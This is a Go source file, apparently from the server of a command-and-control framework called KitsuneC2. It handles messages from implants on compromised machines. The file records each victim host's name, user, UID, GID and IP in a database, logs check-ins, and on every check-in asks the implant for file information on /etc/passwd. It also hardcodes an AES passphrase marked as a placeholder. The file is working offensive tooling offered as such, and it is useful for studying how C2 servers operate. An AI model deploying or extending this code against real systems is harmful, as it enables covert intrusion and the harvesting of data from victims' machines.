//This file contains all related functionality to handling incoming messages sent by implants.

package main

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/server/db"
	"fmt"
	"log"
	"net"
	"time"
)

// we use some clever reflection design so that we do not have to make a huge switch statement containing all possible messageTypes.
// all message types and their corresponding functions can be called through the map below and the one in serializable.go
var messageTypeToFunc = map[int]func(net.Conn, interface{}){
	0: handleImplantRegister,
	1: handleCheckin,
	//reserved for implant functionality
	12: handleFileInfoResp,
}

// This function can be passed to a listener to handle incoming connections. This function guarantees that the connection will be closed after it's
// done.
func tcpHandler(conn net.Conn) {
	defer conn.Close()
	_, messageType, data, err := communication.ReceiveEnvelopeFromImplant(conn, []byte("thisis32bitlongpassphraseimusing")) //TODO: change aes key to a proper one :)
	if err != nil {
		log.Printf("[ERROR] Could not understand message sent by implant. Reason: %s", err.Error())
		return
	}

	handlerFunc := messageTypeToFunc[messageType]

	handlerFunc(conn, data)
}

//-------------------Begin message handlers--------------------

// Handles envelopes with messageType==0. This is the very first message an implant sends to the server.
func handleImplantRegister(conn net.Conn, data interface{}) {
	implantRegister, ok := data.(*communication.ImplantRegister)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=0 (ImplantRegister), but could not convert envelope data to ImplantRegister datastructure")
		return
	}

	var dbEntry *db.Implant_info = new(db.Implant_info)
	dbEntry.Id = implantRegister.ImplantId
	dbEntry.Name = implantRegister.ImplantName
	dbEntry.Hostname = implantRegister.Hostname
	dbEntry.Username = implantRegister.Username
	dbEntry.Uid = implantRegister.UID
	dbEntry.Gid = implantRegister.GID
	dbEntry.Public_ip = conn.RemoteAddr().String()
	dbEntry.Last_checkin = int(time.Now().Unix())
	dbEntry.Os = ""          //TODO
	dbEntry.Arch = ""        //TODO
	dbEntry.Session_key = "" //TODO
	err := db.AddImplant(dbEntry)
	if err != nil {
		log.Printf("[ERROR] could not register implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
	}
}

// Handles envelopes with messageType==1. Every x amount of time, an implant sends a check-in message which this function handles.
func handleCheckin(conn net.Conn, data interface{}) {
	implantCheckin, ok := data.(*communication.ImplantCheckin)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=1 (Checkin), but could not convert envelope data to Checkin datastructure")
		return
	}
	fmt.Println(implantCheckin.ImplantId)
	RequestFileInfo(conn, "/etc/passwd")
}

// Handles envelopes with messageType==12. The implant sends this message when the server sends a request for fileInfo.
func handleFileInfoResp(conn net.Conn, data interface{}) {
	fileInfoResp, ok := data.(*communication.FileInfoResp)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=2 (FileInfoResp), but could not convert envelope data to FileInfoResp datastructure")
		return
	}
	fmt.Printf("name: %s\nsize: %d\nmode: %s\nmodTime: %d\nisDir: %t", fileInfoResp.Name, fileInfoResp.Size, fileInfoResp.Mode, fileInfoResp.ModTime, fileInfoResp.IsDir)
}
